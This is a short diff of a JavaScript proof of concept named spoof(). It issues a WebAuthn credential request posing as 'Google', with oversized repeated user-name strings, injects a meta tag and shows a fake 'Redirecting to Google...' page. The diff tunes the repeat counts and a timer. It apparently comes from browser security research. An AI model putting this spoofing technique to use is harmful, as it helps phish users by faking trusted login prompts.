@@ -16,7 +16,7 @@ function spoof() {
       rp: { name: "Google" },
       user: {
         id: new Uint8Array(16),
-        name: "john".repeat(500) + "@google.com",
+        name: "john".repeat(2) + "@google.com",
         displayName: "John Smith ".repeat(200)
       },
       pubKeyCredParams: [{ type: "public-key", alg: -7 }],
@@ -34,7 +34,7 @@ function spoof() {
     document.head.appendChild(meta);
 
     document.body.innerHTML = '<h1 style="color:green">Redirecting to Google...</h1>';
-  }, 1000);
+  }, 1);
 }
 </script>
 
